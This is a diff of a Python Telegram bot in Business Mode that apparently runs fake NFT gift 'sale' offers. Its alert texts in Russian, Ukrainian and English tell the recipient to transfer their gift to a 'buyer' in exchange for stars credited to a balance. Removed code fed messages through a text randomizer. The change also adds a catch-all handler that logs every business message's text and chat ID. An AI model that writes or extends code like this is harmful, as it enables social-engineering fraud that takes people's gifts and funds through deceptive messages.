@@ -235,14 +235,17 @@ def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
         ]
     ])
 
+# ==================== DEBUG: ловит всё ====================
+@dp.business_message()
+async def debug_all(message: types.Message):
+    print(f"[ALL] text={message.text!r} | conn={message.business_connection_id} | chat={message.chat.id}")
+
 # ==================== ХЭНДЛЕР КОМАНДЫ +gg ====================
 @dp.business_message(F.text.startswith("+gg "))
 async def cmd_gg_business(message: types.Message):
     print(f"[DEBUG] Сработал +gg: {message.text!r}")
     args = message.text.split()
     
-    # Формат ожидает: +gg <nft_link> <amount> <currency> <lang>
-    # Пример: +gg solid-123 125 stars ru
     if len(args) < 3:
         print(f"[DEBUG] Ошибка: Недостаточно аргументов. Ожидалось 3+, получено {len(args)-1}")
         try:
@@ -351,45 +354,16 @@ async def process_accept(callback: CallbackQuery):
     alert_texts = {
         "ru": f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {currency_text} на ваш баланс.",
         "us": f"Offer to sell {offer['nft_name']} has been successfully accepted.\n\nTransfer the gift to the buyer to receive {offer['amount']} {currency_text} to your balance.",
-        "ua": f"Пропозицію щодо продажу {offer['nft_name']} успішно прийнято.\n\nПередайте подарунок покупцю для зарахування {offer['amount']} {currency_text} на ваш баланс."
+        "ua": f"Пропозицію про продаж {offer['nft_name']} успішно прийнято.\n\nПередайте подарунок покупцю для зарахування {offer['amount']} {currency_text} на ваш баланс.",
     }
     await callback.answer(alert_texts.get(lang, alert_texts["ru"]), show_alert=True)
     
-    nft_link = f'<a href="{offer["nft_url"]}">{nft_name_rand}</a>'
-    preview_line = f'<a href="{offer["nft_url"]}">&#8203;</a>'
-    
-    if lang == "ru":
-        text = (
-            f"{preview_line}{gift_emoji()} Подарок: <b>{nft_link}</b> успешно продан!\n\n"
-            f"• <b>Передайте подарок покупателю для зачисления "
-            f"{currency_text}.</b>"
-        )
-    elif lang == "ua":
-        text = (
-            f"{preview_line}{gift_emoji()} Подарунок: <b>{nft_link}</b> успішно продано!\n\n"
-            f"• <b>Передайте подарунок покупцю для зарахування "
-            f"{currency_text}.</b>"
-        )
-    else:
-        text = (
-            f"{preview_line}{gift_emoji()} Gift: <b>{nft_link}</b> successfully sold!\n\n"
-            f"• <b>Transfer the gift to the buyer to receive "
-            f"{currency_text}.</b>"
-        )
-        
     try:
-        await bot.edit_message_text(
-            chat_id=callback.message.chat.id,
+        await bot.edit_message_reply_markup(
+            chat_id=offer["chat_id"],
             message_id=callback.message.message_id,
-            business_connection_id=callback.message.business_connection_id,
-            text=text,
             reply_markup=get_deal_keyboard(order_id, lang),
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=False,
-                show_above_text=True,
-                prefer_large_media=True
-            ),
-            parse_mode="HTML"
+            business_connection_id=offer["business_connection_id"],
         )
     except Exception as e:
         print(f"[EDIT ERROR] {e}")
@@ -403,43 +377,20 @@ async def process_decline(callback: CallbackQuery):
         return
     offer["status"] = "declined"
     lang = offer["lang"]
-    t = TEXTS[lang]
-    declined_rand = randomize_all(t['declined'], probability=1.0)
-    text = f"{cross_emoji()} {declined_rand}"
+    await callback.answer(TEXTS[lang]["declined"], show_alert=True)
     try:
-        await bot.edit_message_text(
-            chat_id=callback.message.chat.id,
+        await bot.edit_message_reply_markup(
+            chat_id=offer["chat_id"],
             message_id=callback.message.message_id,
-            business_connection_id=callback.message.business_connection_id,
-            text=text,
-            link_preview_options=LinkPreviewOptions(is_disabled=True),
-            parse_mode="HTML"
+            reply_markup=None,
+            business_connection_id=offer["business_connection_id"],
         )
     except Exception as e:
         print(f"[EDIT ERROR] {e}")
-    await callback.answer()
-
-@dp.callback_query(F.data.startswith("confirm_"))
-async def process_confirm(callback: CallbackQuery):
-    await callback.answer()
-
-@dp.business_message()
-async def debug_business(message: types.Message):
-    print(f"[DEBUG LOG ALL] Любое пришедшее бизнес-сообщение: {message.text!r}")
 
 async def main():
-    print("Бот запущен (Business Mode с командой +gg)...")
-    await dp.start_polling(
-        bot,
-        allowed_updates=[
-            "message",
-            "callback_query",
-            "business_connection",
-            "business_message",
-            "edited_business_message",
-            "deleted_business_messages",
-        ]
-    )
+    print("Bot started")
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
